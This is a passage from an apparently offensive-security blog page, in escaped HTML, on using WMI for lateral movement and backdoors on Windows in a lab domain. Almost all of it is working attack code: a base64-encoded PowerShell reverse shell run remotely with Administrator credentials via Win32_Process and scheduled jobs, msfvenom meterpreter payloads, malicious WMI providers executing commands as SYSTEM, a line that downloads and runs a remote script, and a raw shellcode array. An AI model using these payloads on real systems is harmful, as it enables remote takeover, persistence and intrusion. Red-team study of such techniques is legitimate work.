([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$EncodedShell&lt;/span> &lt;span class="p">=[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Unicode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$Shell&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># You can also use msfvenom to generate the base64-encoded reverse shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">msfvenom&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">payload&lt;/span> &lt;span class="n">windows&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">meterpreter&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">reverse_tcp&lt;/span> &lt;span class="n">LHOST&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">10.10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">2&lt;/span> &lt;span class="n">LPORT&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">8080&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">format&lt;/span> &lt;span class="n">psh&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">smallest&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">msfvenom&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">payload&lt;/span> &lt;span class="err">–&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">platform&lt;/span> &lt;span class="n">win&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="n">x86&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">encoder&lt;/span> &lt;span class="n">base64&lt;/span> &lt;span class="n">NOEXIT&lt;/span> &lt;span class="n">SYSWOW64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute the process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;c:\Windows\System32\cmd.exe /c powershell -e &lt;/span>&lt;span class="nv">$EncodedShell&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.10&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get a reverse shell using &lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-scheduledjob" target="_blank" rel="noopener">Win32_ScheduledJob&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># On the local machine it is necessary to open a listener using powercat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-v&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8080&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">10000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create the base64-encoded reverse shell (command to be executed with powershell -e $EncodedShell)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$port&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">8080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Shell&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s1">&amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;,&amp;#39;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$port&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s1">&amp;#39;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$EncodedShell&lt;/span> &lt;span class="p">=[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Unicode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$Shell&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># You can also use msfvenom to generate the base64-encoded reverse shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">msfvenom&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">payload&lt;/span> &lt;span class="n">windows&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">meterpreter&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">reverse_tcp&lt;/span> &lt;span class="n">LHOST&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">10.10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">2&lt;/span> &lt;span class="n">LPORT&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">8080&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">format&lt;/span> &lt;span class="n">psh&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">smallest&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">msfvenom&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">payload&lt;/span> &lt;span class="err">–&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">platform&lt;/span> &lt;span class="n">win&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="n">x86&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">encoder&lt;/span> &lt;span class="n">base64&lt;/span> &lt;span class="n">NOEXIT&lt;/span> &lt;span class="n">SYSWOW64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute the process at 7:52pm &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$wmi_sched_job&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">wmiclass&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="s2">&amp;#34;\\&lt;/span>&lt;span class="nv">$env:computername&lt;/span>&lt;span class="s2">\root\cimv2:win32_scheduledjob&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$time&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$wmi_sched_job&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ConvertFromDateTime&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;7:52pm&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$task&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;c:\Windows\System32\cmd.exe /c powershell -e &lt;/span>&lt;span class="nv">$EncodedShell&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-List&lt;/span> &lt;span class="n">win32_scheduledjob&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.10&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$task&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$time&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="backdoors---custom-wmi-provider">Backdoors - Custom WMI Provider&lt;/h3>
&lt;p>WMI procides ample opportunities to backdoor a machine.&lt;/p>
&lt;p>&lt;a href="https://github.com/rzander/LocalAdmins" target="_blank" rel="noopener">Win32_LocalAdmins&lt;/a> provider creates a class called Win32_LocalAdmins in the &lt;code>root\cimv2&lt;/code> namespace which can be used to list all local administrators.&lt;/p>
&lt;p>&lt;a href="https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider" target="_blank" rel="noopener">Evil Network Connection WMI Provider&lt;/a> provides ability to execute Powershell command with SYSTEM privileges. It needs elevated privileges to be installed. Powershell.exe in not used to execute the payload.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Install Provider&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd &lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">downloadpath&lt;/span>&lt;span class="p">&amp;gt;\&lt;/span>&lt;span class="nb">EvilNetConnectionWMIProvider-master&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">EvilNetConnectionWMIProvider&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Debug&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">InstallUtil&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">EvilNetConnectionWMIProvider&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">dll&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Uninstall Provider&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd &lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">downloadpath&lt;/span>&lt;span class="p">&amp;gt;\&lt;/span>&lt;span class="nb">EvilNetConnectionWMIProvider-master&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">EvilNetConnectionWMIProvider&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Debug&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Uninstall&lt;/span> &lt;span class="s2">&amp;#34;InstallUtil.exe /u EvilNetConnectionWMIProvider.dll&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Query network connections (netstat)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WMIObject&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">LocalAddress&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">LocalPort&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RemoteAddress&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RemotePort&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Protocol&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">State&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft &lt;/span>&lt;span class="n">-AutoSize&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute arbitrary Powershell ss SYSTEM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WMIMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RunPs&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$NULL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WMIMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RunPs&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;Get-Process&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$NULL&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Of course, these methods can be invoked from a remote box using &lt;code>-ComputerName&lt;/code> and &lt;code>-Credential&lt;/code> parameters, but we still need admin privs on the target box.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Query network connections (netstat)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WMIObject&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">LocalAddress&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">LocalPort&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RemoteAddress&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RemotePort&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Protocol&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">State&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft &lt;/span>&lt;span class="n">-AutoSize&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute arbitrary Powershell as SYSTEM &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WMIMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RunPs&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$NULL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WMIMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RunPs&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;Get-Process&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$NULL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WMIMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RunPs&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &lt;/span>&lt;span class="nv">$EncodedShell&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$NULL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute a Powershell script as SYSTEM &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WMIMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetConnection&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RunPs&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.1.2/script.ps1&amp;#39;)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="vm">$NULL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://gist.github.com/TheWover/4272ea5829d7f6b22fadaeb8aee3229a" target="_blank" rel="noopener">Evil WMI Provider&lt;/a> can be used to launch custom shellcode on a target box:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Evil&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">ExecShellcode&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">0x90&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x90&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x90&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="vm">$NULL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cimv2&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Evil&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">ExecShellCalcCode&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">$null&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">byte[]&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$sc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">0xfc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x83&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xf0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x51&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x51&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x56&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x65&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x60&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x18&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x72&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x0f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xb7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x4a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x4a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x4d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xac&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x3c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x61&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x7c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x02&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x2c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x0d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xe2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xed&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x51&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x42&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x3c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x88&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x00&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x85&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xc0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x74&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x67&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0xd0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x18&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x44&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x8b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x40&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x49&lt;/span>&lt;span class="p">,&lt;/span>&lt;span 